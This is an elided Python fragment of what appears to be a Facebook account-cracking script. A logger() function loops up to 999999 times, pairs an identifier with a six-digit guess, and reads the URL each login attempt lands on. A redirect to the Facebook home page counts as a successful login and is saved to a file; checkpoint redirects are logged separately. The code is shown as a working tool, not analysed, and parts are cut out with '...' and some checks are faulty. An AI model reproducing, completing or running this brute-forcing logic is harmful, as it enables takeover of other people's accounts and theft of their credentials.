...
def logger():
    ...
    while i < 999999:
        ...
        content = sub.geturl()
        result = lol + "||" + digi6 + "\n\n"
        conter = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100', 'https://www.facebook.com/confirmemail.php?next=https%3A%2F%2Fwww.facebook.com%2F&rd', 'https://m.facebook.com/checkpoint?next', 'https://www.facebook.com/checkpoint/?next', 'https://m.facebook.com/gettingstarted/?_rdr'
#        if content == 'https://www.facebook.com' or content!='https://www.facebook.com/checkpoint/?next' or content == 'https://www.facebook.com' :
        if content!=conter and content=='https://www.facebook.com/'or content=='https://www.facebook.com/':
            result = lol + "||" + digi6 + "\n\n"
            ...
            filer.close()
        elif content == 'https://www.facebook.com/checkpoint/?next' or content=='https://m.facebook.com/checkpoint?next':
            result = lol + "||" + digi6 + "\n\n"
